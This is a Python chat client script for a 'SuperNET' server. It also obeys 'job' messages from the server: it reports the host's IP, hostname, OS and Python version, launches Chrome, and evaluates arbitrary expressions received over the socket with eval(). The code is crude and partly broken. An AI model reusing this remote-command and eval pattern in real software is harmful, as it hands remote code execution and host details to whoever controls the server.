import socket, threading
import os
import sys
import platform

# Keys to send different types of data

Job_key = "THIS IS A JOB TASK"
server_private_key = "8d6fsdfh39ur893uruf86we7f58734y uihuhUYGIUDHS*&AD9d8 3yuh78y(*iu(d*&D"
expression_key = "This is an expresiion"
Query_Key = "This is a Query"

def handle_messages(connection: socket.socket):
    '''
        Receive messages sent by the server and display them to user
    '''
    SERVER_ADDRESS = '127.0.1.1' # change to the server
    SERVER_PORT = 12000

    while True:
        try:
            msg = connection.recv(1024)
            is_not_for_me = False
            # If there is no message, there is a chance that connection has closed
            # so the connection will be closed and an error will be displayed.
            # If not, it will try to decode message in order to show to user.
            if msg:
                sock = socket.socket()
                #sock.connect((SERVER_ADDRESS, SERVER_PORT))

                if Job_key in msg.decode():
                    print("This is a job server message")
                    sock = socket.socket()
                    sock.connect((SERVER_ADDRESS, SERVER_PORT))
                    if (msg.decode()).strip(Job_key) == "Get IP":

                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect(("8.8.8.8", 80))
                        IP = (s.getsockname()[0])
                        print(s.getsockname()[0])
                        # s.close()

                        print ("Sending IP info...")
                        # sock = socket.socket()
                        # sock.connect((SERVER_ADDRESS, SERVER_PORT))
                        sock.send(IP.encode())

                    #   Return different data to boss depending on server broadcast

                    elif (msg.decode()).strip(Job_key) == "hostthing":
                        print("sending hostname")
                        hostnamething = socket.gethostname()
                        sock.send(hostnamething.encode())

                    elif (msg.decode()).strip(Job_key) == "Get python version":
                        V = sys.version
                        print (V)
                        sock.send(V.encode())

                    elif (msg.decode()).strip(Job_key) == "thing":

                        if str(platform.system()) == "Windows":

                            os.system("start chrome.exe")
                            sock.send("Started Chrome!".encode())
                        else:
                            print ("Were non-compatible")
                            sock.send("OS non-compatible with request".encode())

                    elif (msg.decode()).strip(Job_key) == "thing2":
                        os.system("start chrome.exe")

                        sock.send("Started Chrome".encode())

                    elif (msg.decode()).strip(Job_key) == "bruh":
                        current_os = platform.system()
                        print ("Sending OS type...")
                        sock.send(str(current_os).encode())


                if expression_key in msg.decode():
                    m = msg.decode()
                    exp = m[len(expression_key):]
                    answer = str(eval(exp))

                    sock.send(answer.encode())

                if Job_key in msg.decode() and Query_Key in msg.decode():
                    m = msg.decode()
                    n = m.strip(Job_key)
                    query = n.strip(Query_Key)
                    thing = "start chrome '"
                    os.system("start chrome ? Banana")


                if server_private_key in msg.decode():
                    is_not_for_me = True

                # if is_not_for_me == True:
                #         m = msg.decode()
                #         print(m[len(server_private_key):]

                # if is_not_for_me == False:
                #     print (msg.decode())

            else:
                connection.close()
                break


        except Exception as e:
            print(f'Error handling message from server: {e}')
            connection.close()
            break

def client() -> None:
    '''
        Main process that start client connection to the server
        and handle it's input messages
    '''

    SERVER_ADDRESS = '127.0.1.1'
    SERVER_PORT = 12000

    try:
        # Instantiate socket and start connection with server
        socket_instance = socket.socket()
        socket_instance.connect((SERVER_ADDRESS, SERVER_PORT))
        # Create a thread in order to handle messages sent by server
        threading.Thread(target=handle_messages, args=[socket_instance]).start()

        print('Succesfully connected to SuperNET!')

		# Read user's input until it quit from chat and close connection
        count = 0
        while True:
            if count == 4:
                socket_instance = socket.socket()
                socket_instance.connect((SERVER_ADDRESS, SERVER_PORT))
                count = 0
            msg = input("MSG >> ")
            if msg == 'quit':
                break

		    # Parse message to utf-8
            socket_instance.send(msg.encode())
            count += 1

		# Close connection with the server
        socket_instance.close()
        print ("closed connection with server")
        quit()
        exit()

    except Exception as e:
        print(f'Error connecting to server socket {e}')
        socket_instance.close()


if __name__ == "__main__":
    client()
